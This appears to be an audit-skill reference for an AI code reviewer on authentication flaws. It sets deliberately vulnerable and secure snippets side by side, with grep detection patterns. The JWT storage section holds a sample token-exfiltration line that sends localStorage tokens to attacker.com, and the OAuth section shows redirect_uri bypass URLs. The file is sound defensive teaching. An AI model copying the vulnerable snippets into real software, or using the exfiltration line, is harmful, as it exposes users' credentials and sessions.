<!-- Adapted audit reference. Apply its vulnerability-specific checks through the Antigravity BALLS workflow and evidence rules. -->

# Authentication Vulnerability Detection Skill

## Overview

Authentication vulnerabilities represent one of the most critical classes of security flaws in modern applications. When authentication mechanisms are broken or improperly implemented, attackers can compromise passwords, keys, session tokens, or exploit other implementation flaws to assume other users' identities temporarily or permanently.

**OWASP Classification**: A07:2021 – Identification and Authentication Failures (previously A02:2017 – Broken Authentication).

**Impact**:
- **Account Takeover (ATO)**: Attackers gain full control of user accounts, including administrative accounts.
- **Data Breach**: Unauthorized access to sensitive personal, financial, or medical data.
- **Identity Theft**: Stolen credentials used to impersonate users across multiple services.
- **Privilege Escalation**: Exploiting session or token flaws to gain elevated permissions.
- **Regulatory Violations**: GDPR, HIPAA, PCI-DSS non-compliance leading to fines and legal action.

**Scope of Detection**: This skill covers password storage, JWT handling, session management, OAuth/OIDC flows, brute force protections, password reset mechanisms, MFA implementation, and timing side-channels.

For login/signup/recovery attempt limits, account enumeration, and input-path comparison, also apply [`authentication-abuse.md`](authentication-abuse.md). Inventory and inspect each credential-handling endpoint separately; a review of password hashing does not count as review of endpoint abuse controls.

### Route-by-route authentication checklist

For every login, signup, logout, password reset, MFA, and account-linking route, record its method, unauthenticated/authenticated preconditions, state changes, and failure branches. Trace whether credentials are normalized consistently, whether malformed or non-ASCII values fail safely, and whether responses distinguish unknown identities from wrong credentials. Inspect rate limiting, lockout, backoff, and recovery behavior in the repository's actual middleware/configuration path; do not infer that a proxy provides controls absent from the repository. Treat login CSRF and logout CSRF as separate route questions and assess their concrete impact rather than omitting them categorically.

---

## Vulnerability Patterns

### 1. Insecure Password Storage

Passwords stored using weak, unsalted, or reversible methods allow attackers to recover plaintext credentials from database dumps.

#### 1.1 MD5/SHA1/SHA256 Without Salt

These algorithms are cryptographic hash functions, NOT password hashing functions. They are fast by design, making them trivially brute-forceable with modern GPUs.

**Python**:
```python
# VULNERABLE: MD5 hash without salt
import hashlib
password_hash = hashlib.md5(password.encode()).hexdigest()

# VULNERABLE: SHA1 without salt
password_hash = hashlib.sha1(password.encode()).hexdigest()

# VULNERABLE: SHA256 without salt — still fast, still brutable
password_hash = hashlib.sha256(password.encode()).hexdigest()
```

**Java**:
```java
// VULNERABLE: MD5 digest
MessageDigest md = MessageDigest.getInstance("MD5");
byte[] hash = md.digest(password.getBytes("UTF-8"));

// VULNERABLE: SHA-1 digest
MessageDigest sha1 = MessageDigest.getInstance("SHA-1");
byte[] hash = sha1.digest(password.getBytes());
```

**Node.js**:
```javascript
// VULNERABLE: SHA1 hash
const hash = crypto.createHash('sha1').update(password).digest('hex');

// VULNERABLE: MD5 hash
const hash = crypto.createHash('md5').update(password).digest('hex');
```

**C#/.NET**:
```csharp
// VULNERABLE: MD5 hash
using var md5 = MD5.Create();
byte[] hash = md5.ComputeHash(Encoding.UTF8.GetBytes(password));

// VULNERABLE: SHA256 without salt or iterations
using var sha256 = SHA256.Create();
byte[] hash = sha256.ComputeHash(Encoding.UTF8.GetBytes(password));
```

#### 1.2 Weak Bcrypt Cost Factor

Bcrypt with a cost factor below 10 is too fast on modern hardware. OWASP recommends a minimum cost factor of 10, with 12+ preferred.

```python
# VULNERABLE: Cost factor too low (4)
bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=4))
```

```javascript
// VULNERABLE: Salt rounds below 10
const hash = await bcrypt.hash(password, 6);
```

```java
// VULNERABLE: Low strength parameter
BCryptPasswordEncoder encoder = new BCryptPasswordEncoder(4);
```

#### 1.3 Missing Salt, Static Salt, Short Salt

```python
# VULNERABLE: Static salt shared across all users
SALT = "my_application_salt"
hash = hashlib.sha256((SALT + password).encode()).hexdigest()

# VULNERABLE: Short salt (less than 16 bytes)
salt = os.urandom(4)
```

```java
// VULNERABLE: Hardcoded static salt
private static final byte[] SALT = "StaticSalt".getBytes();
MessageDigest md = MessageDigest.getInstance("SHA-256");
md.update(SALT);
byte[] hash = md.digest(password.getBytes());
```

#### 1.4 Reversible Encryption Instead of Hashing

```python
# VULNERABLE: AES encryption of passwords — reversible!
from cryptography.fernet import Fernet
cipher = Fernet(key)
encrypted_password = cipher.encrypt(password.encode())

# VULNERABLE: Base64 encoding is NOT encryption or hashing
stored = base64.b64encode(password.encode())
```

```javascript
// VULNERABLE: AES encryption of password
const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
let encrypted = cipher.update(password, 'utf8', 'hex');
```

#### 1.5 SECURE Password Storage Patterns

```python
# SECURE: bcrypt with adequate cost
import bcrypt
hashed = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt(rounds=12))

# SECURE: argon2id (preferred for new applications)
from argon2 import PasswordHasher
ph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)
hashed = ph.hash(password)

# SECURE: scrypt with proper parameters
import hashlib
hashed = hashlib.scrypt(password.encode(), salt=os.urandom(16), n=16384, r=8, p=1)
```

```javascript
// SECURE: bcrypt with cost factor 12
const hash = await bcrypt.hash(password, 12);

// SECURE: scrypt
const salt = crypto.randomBytes(16);
crypto.scrypt(password, salt, 64, { N: 16384, r: 8, p: 1 }, (err, derived) => { ... });
```

```java
// SECURE: BCrypt with strength 12
BCryptPasswordEncoder encoder = new BCryptPasswordEncoder(12);
String hash = encoder.encode(password);
```

```csharp
// SECURE: Rfc2898DeriveBytes (PBKDF2) with high iterations and SHA-512
using var pbkdf2 = new Rfc2898DeriveBytes(password, saltBytes, 600000, HashAlgorithmName.SHA512);
```

---

### 2. JWT Vulnerabilities

JSON Web Tokens are widely used for stateless authentication but are frequently misconfigured, leading to token forgery, privilege escalation, and session hijacking.

#### 2.1 Algorithm "none" Attack

The JWT spec includes an `alg: "none"` option for unsecured tokens. If the server doesn't explicitly reject this, attackers can forge arbitrary tokens.

```python
# VULNERABLE: No algorithm validation
import jwt
payload = jwt.decode(token, options={"verify_signature": False})

# VULNERABLE: Accepting any algorithm
payload = jwt.decode(token, secret, algorithms=["HS256", "none"])
```

```javascript
// VULNERABLE: verify option disabled
const payload = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] });

// VULNERABLE: No verification at all
const payload = jwt.decode(token, { complete: true });
// jwt.decode does NOT verify signature in jsonwebtoken library
```

```java
// VULNERABLE: Not restricting algorithms
JwtParser parser = Jwts.parser().setSigningKey(secret);
Claims claims = parser.parseClaimsJws(token).getBody();
// If library doesn't reject 'none', token is forgeable
```

```csharp
// VULNERABLE: Signature validation disabled
var parameters = new TokenValidationParameters {
    ValidateIssuerSigningKey = false,  // DANGEROUS
    RequireSignedTokens = false        // DANGEROUS
};
```

#### 2.2 Key Confusion (RS256 → HS256)

When a server uses RS256 (asymmetric), the attacker can switch the algorithm to HS256 (symmetric) and sign the token with the public key (which is often publicly available).

```javascript
// VULNERABLE: Library accepts both symmetric and asymmetric algorithms
const payload = jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] });
// Attacker signs with HS256 using the public key as the HMAC secret
```

```python
# VULNERABLE: Algorithm not pinned
payload = jwt.decode(token, public_key, algorithms=["RS256", "HS256"])
```

#### 2.3 Weak/Hardcoded JWT Secrets

```python
# VULNERABLE: Weak secret
SECRET_KEY = "secret"
token = jwt.encode(payload, SECRET_KEY, algorithm="HS256")

# VULNERABLE: Hardcoded secret in source code
JWT_SECRET = "myapp-jwt-secret-key-2024"
```

```javascript
// VULNERABLE: Short, guessable secret
const token = jwt.sign(payload, 'password123', { algorithm: 'HS256' });

// VULNERABLE: Secret from environment but with fallback default
const secret = process.env.JWT_SECRET || 'default-secret';
```

```java
// VULNERABLE: Hardcoded key
private static final String SECRET = "my-secret-key";
String token = Jwts.builder().setSubject(user).signWith(SignatureAlgorithm.HS256, SECRET).compact();
```

#### 2.4 Missing Claims Validation

```python
# VULNERABLE: No expiration check
payload = jwt.decode(token, secret, algorithms=["HS256"], options={"verify_exp": False})

# VULNERABLE: No audience or issuer validation
payload = jwt.decode(token, secret, algorithms=["HS256"])
# Missing: audience=, issuer= parameters
```

```javascript
// VULNERABLE: Expiration not checked
const payload = jwt.verify(token, secret, { ignoreExpiration: true });

// VULNERABLE: No audience/issuer validation
const payload = jwt.verify(token, secret);
// Missing: audience, issuer options
```

#### 2.5 Token Storage in localStorage (XSS Accessible)

```javascript
// VULNERABLE: Token accessible via XSS
localStorage.setItem('token', jwtToken);
sessionStorage.setItem('auth_token', jwtToken);

// Any XSS vulnerability can steal the token:
// fetch('https://attacker.com/steal?t=' + localStorage.getItem('token'))
```

#### 2.6 JWK Injection / jku/x5u Header Manipulation

```python
# VULNERABLE: Trusting jku header to fetch signing key
header = jwt.get_unverified_header(token)
jwks_url = header['jku']  # Attacker-controlled URL
keys = requests.get(jwks_url).json()  # Fetches attacker's key
```

#### 2.7 SECURE JWT Patterns

```python
# SECURE: Pinned algorithm, all claims validated
payload = jwt.decode(
    token,
    secret,
    algorithms=["HS256"],  # Explicitly pin algorithm
    audience="my-app",
    issuer="auth-server",
    options={"require": ["exp", "iat", "aud", "iss"]}
)
```

```javascript
// SECURE: Full validation
const payload = jwt.verify(token, secret, {
    algorithms: ['HS256'],       // Pin algorithm
    audience: 'my-app',
    issuer: 'auth-server',
    maxAge: '1h',
    clockTolerance: 30
});
```

---

### 3. Session Management Flaws

#### 3.1 Session Fixation

Not regenerating the session ID after authentication allows attackers to set a known session ID before the victim logs in.

```python
# VULNERABLE: No session regeneration after login
@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form['username'], request.form['password'])
    if user:
        session['user_id'] = user.id  # Same session ID as before login
        return redirect('/dashboard')
```

```java
// VULNERABLE: Session not regenerated
HttpSession session = request.getSession();
session.setAttribute("user", authenticatedUser);
// Missing: request.changeSessionId() or session.invalidate() + getSession(true)
```

```php
// VULNERABLE: No session regeneration
$_SESSION['user_id'] = $user->id;
// Missing: session_regenerate_id(true);
```

**SECURE**:
```python
# SECURE: Regenerate session after login (Flask)
from flask import session
session.regenerate()  # Or framework-specific method

# SECURE: Django handles this automatically with django.contrib.auth.login()
```

```java
// SECURE: Regenerate session ID
request.changeSessionId();
session.setAttribute("user", authenticatedUser);
```

#### 3.2 Predictable Session Tokens

```python
# VULNERABLE: Sequential session IDs
session_id = str(current_user_count + 1)

# VULNERABLE: Timestamp-based session ID
session_id = str(int(time.time()))

# VULNERABLE: Weak random
import random
session_id = str(random.randint(100000, 999999))
```

#### 3.3 Session Tokens in URLs

```python
# VULNERABLE: Session ID in URL parameter
redirect(f'/dashboard?session_id={session_token}')
# Leaks via Referer header, browser history, server logs, proxy logs
```

#### 3.4 Missing Session Expiration / Timeout

```python
# VULNERABLE: No absolute timeout
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=365)

# VULNERABLE: No idle timeout configured at all
```

```javascript
// VULNERABLE: Cookie with no expiration (or very long expiration)
res.cookie('session', token, { maxAge: 365 * 24 * 60 * 60 * 1000 });
```

#### 3.5 Not Invalidating Sessions on Logout / Password Change

```python
# VULNERABLE: Logout only clears client cookie, not server session
@app.route('/logout')
def logout():
    response = redirect('/login')
    response.delete_cookie('session')
    return response
    # Server-side session still valid! Attacker can reuse stolen token.
```

#### 3.6 Cookie Flags Missing

```python
# VULNERABLE: Missing security flags
response.set_cookie('session', token)
# Missing: secure=True, httponly=True, samesite='Lax'
```

```javascript
// VULNERABLE: No security attributes on session cookie
res.cookie('sessionId', token);
// Missing: { httpOnly: true, secure: true, sameSite: 'Lax' }
```

```java
// VULNERABLE: Cookie created without flags
Cookie sessionCookie = new Cookie("JSESSIONID", sessionId);
response.addCookie(sessionCookie);
// Missing: setHttpOnly(true), setSecure(true)
```

**SECURE**:
```javascript
// SECURE: All security flags set
res.cookie('sessionId', token, {
    httpOnly: true,
    secure: true,
    sameSite: 'Lax',
    maxAge: 3600000,
    path: '/',
    domain: '.example.com'
});
```

---

### 4. OAuth/OIDC Flaws

#### 4.1 Open Redirect in redirect_uri Validation

```python
# VULNERABLE: Substring/prefix matching allows bypass
ALLOWED_REDIRECT = "https://app.example.com/callback"
if redirect_uri.startswith(ALLOWED_REDIRECT):
    # Attacker uses: https://app.example.com/callback.attacker.com
    # Or: https://app.example.com/callback/../../../attacker.com

# VULNERABLE: Domain suffix matching
if redirect_uri.endswith("example.com"):
    # Attacker uses: https://notexample.com or https://evil-example.com
```

#### 4.2 Missing State Parameter (CSRF on OAuth Flow)

```python
# VULNERABLE: No state parameter in authorization request
auth_url = f"{OAUTH_PROVIDER}/authorize?client_id={CLIENT_ID}&redirect_uri={CALLBACK}&response_type=code"
# Missing: &state=<random_csrf_token>
```

```javascript
// VULNERABLE: State parameter not validated on callback
app.get('/callback', (req, res) => {
    const code = req.query.code;
    // Missing: Validate req.query.state matches session-stored state
    exchangeCodeForToken(code);
});
```

#### 4.3 Authorization Code Injection

```python
# VULNERABLE: No PKCE, code can be intercepted and replayed
# Attacker intercepts authorization code from redirect and exchanges it
token_response = requests.post(token_url, data={
    'grant_type': 'authorization_code',
    'code': stolen_code,
    'redirect_uri': redirect_uri,
    'client_id': client_id
    # No code_verifier — PKCE not used
})
```

#### 4.4 Implicit Flow Usage (Deprecated)

```javascript
// VULNERABLE: Implicit flow exposes token in URL fragment
const authUrl = `${provider}/authorize?response_type=token&client_id=${clientId}&redirect_uri=${callback}`;
// Token appears in URL fragment: callback#access_token=xyz
// Visible in browser history, referrer headers, proxy logs
```

#### 4.5 PKCE Missing for Public Clients

```python
# VULNERABLE: Public client (SPA/mobile) without PKCE
auth_params = {
    'client_id': CLIENT_ID,
    'response_type': 'code',
    'redirect_uri': REDIRECT_URI,
    'scope': 'openid profile'
    # Missing: code_challenge, code_challenge_method
}
```

**SECURE**:
```python
# SECURE: OAuth with state and PKCE
import secrets, hashlib, base64

state = secrets.token_urlsafe(32)
code_verifier = secrets.token_urlsafe(64)
code_challenge = base64.urlsafe_b64encode(
    hashlib.sha256(code_verifier.encode()).digest()
).rstrip(b'=').decode()

auth_params = {
    'client_id': CLIENT_ID,
    'response_type': 'code',
    'redirect_uri': REDIRECT_URI,
    'scope': 'openid profile',
    'state': state,
    'code_challenge': code_challenge,
    'code_challenge_method': 'S256'
}
session['oauth_state'] = state
session['code_verifier'] = code_verifier
```

---

### 5. Brute Force / Credential Stuffing

#### 5.1 No Rate Limiting on Login Endpoints

```python
# VULNERABLE: No rate limiting
@app.route('/api/login', methods=['POST'])
def login():
    user = User.query.filter_by(email=request.json['email']).first()
    if user and user.check_password(request.json['password']):
        return jsonify({'token': generate_token(user)})
    return jsonify({'error': 'Invalid credentials'}), 401
```

```javascript
// VULNERABLE: No rate limiter middleware
app.post('/api/login', async (req, res) => {
    const user = await User.findOne({ email: req.body.email });
    if (user && await bcrypt.compare(req.body.password, user.password)) {
        return res.json({ token: generateToken(user) });
    }
    return res.status(401).json({ error: 'Invalid credentials' });
});
```

#### 5.2 User Enumeration via Error Messages

```python
# VULNERABLE: Different messages reveal if user exists
if not user:
    return jsonify({'error': 'User not found'}), 404
if not user.check_password(password):
    return jsonify({'error': 'Incorrect password'}), 401
```

**SECURE**:
```python
# SECURE: Generic error message
if not user or not user.check_password(password):
    return jsonify({'error': 'Invalid email or password'}), 401
```

#### 5.3 SECURE Rate Limiting Patterns

```python
# SECURE: Rate limiting with Flask-Limiter
from flask_limiter import Limiter
limiter = Limiter(app, default_limits=["200 per day", "50 per hour"])

@app.route('/api/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    ...
```

```javascript
// SECURE: Rate limiting with express-rate-limit
const rateLimit = require('express-rate-limit');
const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 5,
    message: 'Too many login attempts, please try again later.',
    standardHeaders: true,
    legacyHeaders: false
});
app.post('/api/login', loginLimiter, loginHandler);
```

---

### 6. Password Reset Flaws

#### 6.1 Predictable Reset Tokens

```python
# VULNERABLE: Timestamp-based token
reset_token = str(int(time.time()))

# VULNERABLE: Sequential token
reset_token = str(user.id) + str(reset_count)

# VULNERABLE: Weak random
reset_token = str(random.randint(100000, 999999))

# VULNERABLE: MD5 of email + timestamp (guessable)
reset_token = hashlib.md5(f"{email}{time.time()}".encode()).hexdigest()
```

#### 6.2 Reset Tokens That Don't Expire

```python
# VULNERABLE: No expiration set on reset token
user.reset_token = generate_token()
user.save()
# Missing: user.reset_token_expires = datetime.utcnow() + timedelta(hours=1)
```

#### 6.3 Reset Token Not Invalidated After Use

```python
# VULNERABLE: Token still valid after password change
@app.route('/reset-password', methods=['POST'])
def reset_password():
    user = User.query.filter_by(reset_token=request.form['token']).first()
    if user:
        user.password = hash_password(request.form['new_password'])
        user.save()
        # Missing: user.reset_token = None
```

#### 6.4 Password Reset via GET Request

```python
# VULNERABLE: Token in URL query string — logged in server logs, proxy logs, browser history
@app.route('/reset-password', methods=['GET'])
def reset_password():
    token = request.args.get('token')
    new_password = request.args.get('new_password')
    # Sensitive data in GET parameters!
```

**SECURE**:
```python
# SECURE: Password reset implementation
import secrets
from datetime import datetime, timedelta

def create_reset_token(user):
    token = secrets.token_urlsafe(32)
    user.reset_token = hashlib.sha256(token.encode()).hexdigest()  # Store hash, not token
    user.reset_token_expires = datetime.utcnow() + timedelta(hours=1)
    user.save()
    return token  # Send unhashed token to user via email

@app.route('/reset-password', methods=['POST'])
def reset_password():
    token_hash = hashlib.sha256(request.form['token'].encode()).hexdigest()
    user = User.query.filter_by(reset_token=token_hash).first()
    if not user or user.reset_token_expires < datetime.utcnow():
        return jsonify({'error': 'Invalid or expired token'}), 400
    user.password = hash_password(request.form['new_password'])
    user.reset_token = None  # Invalidate token
    user.reset_token_expires = None
    user.save()
    invalidate_all_sessions(user)  # Force re-auth on all devices
```

---

### 7. MFA Bypass

#### 7.1 MFA Check in Client-Side Only

```javascript
// VULNERABLE: MFA enforcement only in frontend
if (user.mfaEnabled) {
    showMFAPrompt();  // Attacker can skip this by calling API directly
} else {
    redirectToDashboard();
}
// Server-side does NOT verify MFA completion before granting access
```

#### 7.2 MFA Step Skippable

```python
# VULNERABLE: Post-MFA endpoint accessible without MFA verification
@app.route('/dashboard')
@login_required  # Only checks if user is authenticated, not MFA status
def dashboard():
    return render_template('dashboard.html')
# Attacker authenticates with password, skips MFA, goes directly to /dashboard
```

**SECURE**:
```python
# SECURE: Server-side MFA enforcement
@app.route('/dashboard')
@login_required
@mfa_required  # Decorator checks session for MFA completion flag
def dashboard():
    return render_template('dashboard.html')

def mfa_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if current_user.mfa_enabled and not session.get('mfa_verified'):
            return redirect('/mfa/verify')
        return f(*args, **kwargs)
    return decorated
```

#### 7.3 Replayable TOTP Codes

```python
# VULNERABLE: No check for TOTP code reuse
def verify_totp(user, code):
    totp = pyotp.TOTP(user.totp_secret)
    return totp.verify(code)
    # Attacker can replay the same code within the 30-second window
```

**SECURE**:
```python
# SECURE: Track last used TOTP code to prevent replay
def verify_totp(user, code):
    totp = pyotp.TOTP(user.totp_secret)
    if not totp.verify(code, valid_window=1):
        return False
    if user.last_totp_code == code:
        return False  # Replay detected
    user.last_totp_code = code
    user.save()
    return True
```

---

### 8. Timing Attacks

Non-constant-time string comparison leaks information about secret values through response time differences.

#### 8.1 Vulnerable Comparisons

```python
# VULNERABLE: Standard string comparison — early exit on first mismatch
if token == stored_token:
    return True

if request.headers.get('X-API-Key') == API_KEY:
    authorize()
```

```javascript
// VULNERABLE: === operator for secret comparison
if (req.headers['x-api-key'] === storedApiKey) { ... }
if (resetToken === user.resetToken) { ... }
```

```java
// VULNERABLE: String.equals() is not constant-time
if (providedToken.equals(storedToken)) { ... }
```

```go
// VULNERABLE: bytes.Equal and == are not constant-time
if token == expectedToken { ... }
if bytes.Equal(provided, expected) { ... }
```

#### 8.2 SECURE Constant-Time Comparisons

```python
# SECURE: Constant-time comparison
import hmac
if hmac.compare_digest(token, stored_token):
    return True

# Also works with secrets module (Python 3.x)
import secrets
if secrets.compare_digest(provided_token, expected_token):
    return True
```

```javascript
// SECURE: Constant-time comparison in Node.js
const crypto = require('crypto');
if (crypto.timingSafeEqual(Buffer.from(token), Buffer.from(storedToken))) { ... }
```

```java
// SECURE: MessageDigest.isEqual is constant-time
if (MessageDigest.isEqual(provided.getBytes(), expected.getBytes())) { ... }
```

```go
// SECURE: subtle.ConstantTimeCompare
import "crypto/subtle"
if subtle.ConstantTimeCompare([]byte(provided), []byte(expected)) == 1 { ... }
```

---

## Detection Methodology

### Step 1: Identify Authentication-Related Files

```
# Find auth-related source files
glob: **/*auth*.*
glob: **/*login*.*
glob: **/*session*.*
glob: **/*password*.*
glob: **/*token*.*
glob: **/*jwt*.*
glob: **/*oauth*.*
glob: **/*mfa*.*
glob: **/*credential*.*
glob: **/*identity*.*
```

### Step 2: Scan for Insecure Password Storage

```
# MD5/SHA1/SHA256 password hashing
grep: hashlib\.(md5|sha1|sha256)\(.*password
grep: MessageDigest\.getInstance\("(MD5|SHA-1|SHA-256)"\)
grep: crypto\.createHash\(['"](md5|sha1|sha256)['"]\)
grep: (MD5|SHA1|SHA256)\.(Create|ComputeHash)

# Weak bcrypt cost
grep: gensalt\(rounds=[1-9]\b
grep: bcrypt\.hash\(.*,\s*[1-9]\)
grep: BCryptPasswordEncoder\([1-9]\)

# Base64 "encryption" of passwords
grep: base64\.(b64encode|encode).*password
grep: btoa\(.*password

# Reversible encryption of passwords
grep: (encrypt|cipher|Cipher).*password
grep: (AES|DES|Blowfish).*password
```

### Step 3: Scan for JWT Vulnerabilities

```
# Algorithm "none" or missing validation
grep: algorithms.*none
grep: verify_signature.*False
grep: ValidateIssuerSigningKey\s*=\s*false
grep: RequireSignedTokens\s*=\s*false
grep: ignoreExpiration.*true
grep: verify_exp.*False

# Weak/hardcoded JWT secrets
grep: (jwt_secret|JWT_SECRET|secret_key|SECRET_KEY)\s*=\s*['"][^'"]{1,20}['"]
grep: signWith.*"[^"]{1,30}"

# localStorage token storage
grep: localStorage\.(setItem|getItem).*token
grep: sessionStorage\.(setItem|getItem).*token

# jku/x5u header trust
grep: header\[['"]jku['"]\]
grep: header\[['"]x5u['"]\]
```

### Step 4: Scan for Session Management Flaws

```
# Missing session regeneration near login logic
grep: session\[.*user
grep: setAttribute.*user

# Session ID in URL
grep: (redirect|url).*session_id
grep: (redirect|url).*sid=

# Cookie without security flags
grep: set_cookie\(
grep: new Cookie\(
grep: res\.cookie\(
# Then verify HttpOnly, Secure, SameSite flags are set
```

### Step 5: Scan for OAuth/OIDC Flaws

```
# Missing state parameter
grep: response_type=code(?!.*state=)
grep: authorize\?.*client_id(?!.*state)

# Implicit flow usage
grep: response_type=token
grep: response_type.*implicit

# Missing PKCE
grep: response_type=code(?!.*code_challenge)

# Weak redirect_uri validation
grep: redirect_uri.*startswith
grep: redirect_uri.*endswith
grep: redirect_uri.*contains
```

### Step 6: Scan for Brute Force / Rate Limiting Gaps

```
# Login endpoints without rate limiting decorators/middleware
grep: (route|post|Post).*login
grep: (route|post|Post).*signin
grep: (route|post|Post).*authenticate
# Verify rate limiter is applied to each match

# User enumeration via error messages
grep: (user not found|email not found|no such user|account does not exist)
grep: (incorrect password|wrong password|password mismatch)
```

### Step 7: Scan for Timing Attack Vulnerabilities

```
# Direct comparison of secrets
grep: (token|secret|key|api.?key|reset.?token)\s*==\s*
grep: \.equals\(.*token
grep: \.equals\(.*secret

# Confirm absence of safe comparison functions
grep: (compare_digest|timingSafeEqual|ConstantTimeCompare|MessageDigest\.isEqual)
```

### Step 8: Scan for Password Reset Flaws

```
# Predictable tokens
grep: reset.*token.*time\.time
grep: reset.*token.*randint
grep: reset.*token.*random\(\)

# Reset via GET
grep: (GET|get).*reset.?password

# Missing token expiration
grep: reset_token\s*=(?!.*expir)
```

---

## Common Sinks and Sources

### Authentication Sinks (Where Credentials Are Processed)
- Login/signin route handlers
- Password verification functions (`check_password`, `compare`, `verify`)
- Token generation and validation functions
- Session creation and management middleware
- OAuth callback handlers
- Password reset handlers
- MFA verification endpoints

### Authentication Sources (Where Credentials Originate)
- HTTP request bodies (`request.form`, `request.json`, `req.body`)
- HTTP headers (`Authorization`, `X-API-Key`, custom auth headers)
- Cookies (`Cookie` header, `req.cookies`)
- URL parameters (`req.query`, `request.args`)
- Configuration files and environment variables (secrets, keys)
- Database fields (stored hashes, tokens, session data)

### Key Files and Patterns to Examine
- `**/middleware/auth.*` — Authentication middleware
- `**/decorators/auth.*` — Auth decorators (Python/Flask)
- `**/guards/*auth*` — Auth guards (NestJS/Angular)
- `**/config/passport.*` — Passport.js configuration
- `**/config/security.*` — Security configuration
- `**/models/user.*` — User model (password hashing)
- `**/controllers/auth*` — Auth controllers
- `**/routes/auth*` — Auth route definitions
- `**/*Strategy.*` — Passport strategies, auth strategies

---

## False Positive Indicators

The following patterns suggest that authentication mechanisms are properly secured and findings should be downgraded or dismissed:

1. **Password Storage**: Bcrypt with cost factor ≥10, argon2id, or scrypt is used. Verify the cost factor is adequate and salt is auto-generated.

2. **JWT Handling**: Library is configured with `algorithms` pinned to a single expected algorithm AND `alg: "none"` is explicitly rejected. Claims `exp`, `aud`, `iss` are validated.

3. **Rate Limiting**: Middleware such as `express-rate-limit`, `Flask-Limiter`, `@RateLimiter`, or WAF-level rate limiting is applied to auth endpoints.

4. **Session Management**: Framework-managed sessions with default secure configuration (e.g., Django's `SessionMiddleware`, Spring Security's session management). Session regeneration occurs on authentication state changes.

5. **OAuth/OIDC**: Well-known OAuth libraries (e.g., `passport-oauth2`, `authlib`, Spring Security OAuth2) used with PKCE and state validation. Redirect URIs validated with exact string match.

6. **Constant-Time Comparison**: Uses of `hmac.compare_digest`, `crypto.timingSafeEqual`, `subtle.ConstantTimeCompare`, or `MessageDigest.isEqual` for token/secret comparison.

7. **Test/Example Code**: Weak patterns appearing only in test fixtures, documentation examples, or seed data scripts.

---

## Severity Assessment

### Critical
- Passwords stored in plaintext or reversible encryption
- JWT `alg: "none"` accepted in production
- Authentication bypass (MFA step skippable, missing auth check on endpoints)
- Hardcoded admin credentials in source code
- Session fixation with no regeneration on login

### High
- MD5/SHA1 password hashing without salt
- Weak JWT secrets (< 32 characters or easily guessable)
- No rate limiting on login endpoint combined with no account lockout
- Password reset tokens that are predictable or never expire
- OAuth implicit flow with sensitive scopes
- Missing state parameter in OAuth flow

### Medium
- Bcrypt with low cost factor (4-9) — still bcrypt, but weakened
- JWT stored in localStorage (requires XSS to exploit)
- Session cookies missing HttpOnly or Secure flag
- User enumeration via different error messages
- PKCE not used for public OAuth clients
- Reset tokens not invalidated after use

### Low
- Session timeout set too long (> 24 hours) but finite
- Missing SameSite cookie attribute (mitigated by other CSRF protections)
- Timing side-channel on non-critical comparisons
- TOTP replay within same time window (30-second window)

---

## Remediation Patterns

| Vulnerability | Remediation |
|---|---|
| Weak password hashing | Use `argon2id` (preferred) or `bcrypt` with cost ≥ 12. Never use MD5/SHA1/SHA256 for passwords. |
| JWT `alg: "none"` | Pin algorithm in verification: `algorithms=["RS256"]`. Use libraries that reject `none` by default. |
| Key confusion | Always specify expected algorithm. Never accept both symmetric and asymmetric algorithms. |
| Weak JWT secret | Use minimum 256-bit (32-byte) cryptographically random secret. Rotate regularly. Store in secrets manager. |
| Session fixation | Regenerate session ID after every authentication state change (login, logout, privilege change). |
| Missing cookie flags | Set `HttpOnly=true`, `Secure=true`, `SameSite=Lax` (or `Strict`) on all session cookies. |
| OAuth CSRF | Always use `state` parameter with cryptographically random value. Validate on callback. |
| Missing PKCE | Implement PKCE with S256 method for all public clients. Recommended for confidential clients too. |
| No rate limiting | Implement progressive delays or account lockout after 5-10 failed attempts. Use CAPTCHA after threshold. |
| User enumeration | Return identical error messages and response times for valid and invalid usernames. |
| Timing attacks | Use constant-time comparison functions for all secret/token comparisons. |
| Predictable reset tokens | Generate tokens with `secrets.token_urlsafe(32)` or equivalent CSPRNG. Store hashed, not plaintext. |
| MFA bypass | Enforce MFA completion server-side. Use middleware/decorators that check MFA status on every protected request. |

---

## CWE References

| CWE | Name | Applicable Patterns |
|---|---|---|
| [CWE-287](https://cwe.mitre.org/data/definitions/287.html) | Improper Authentication | Authentication bypass, missing auth checks, MFA bypass |
| [CWE-384](https://cwe.mitre.org/data/definitions/384.html) | Session Fixation | Not regenerating session ID after login |
| [CWE-916](https://cwe.mitre.org/data/definitions/916.html) | Use of Password Hash With Insufficient Computational Effort | MD5/SHA1/SHA256 for passwords, low bcrypt cost |
| [CWE-798](https://cwe.mitre.org/data/definitions/798.html) | Use of Hard-coded Credentials | Hardcoded JWT secrets, API keys, admin passwords |
| [CWE-307](https://cwe.mitre.org/data/definitions/307.html) | Improper Restriction of Excessive Authentication Attempts | No rate limiting, no account lockout |
| [CWE-613](https://cwe.mitre.org/data/definitions/613.html) | Insufficient Session Expiration | Long-lived sessions, no idle timeout, no absolute timeout |
| [CWE-640](https://cwe.mitre.org/data/definitions/640.html) | Weak Password Recovery Mechanism for Forgotten Password | Predictable reset tokens, no expiration, enumeration |
| [CWE-208](https://cwe.mitre.org/data/definitions/208.html) | Observable Timing Discrepancy | Non-constant-time comparison of secrets/tokens |
| [CWE-1270](https://cwe.mitre.org/data/definitions/1270.html) | Generation of Incorrect Security Tokens | Weak PRNG for session/reset tokens, predictable JWT |
| [CWE-347](https://cwe.mitre.org/data/definitions/347.html) | Improper Verification of Cryptographic Signature | JWT signature not verified, `alg: "none"` accepted |
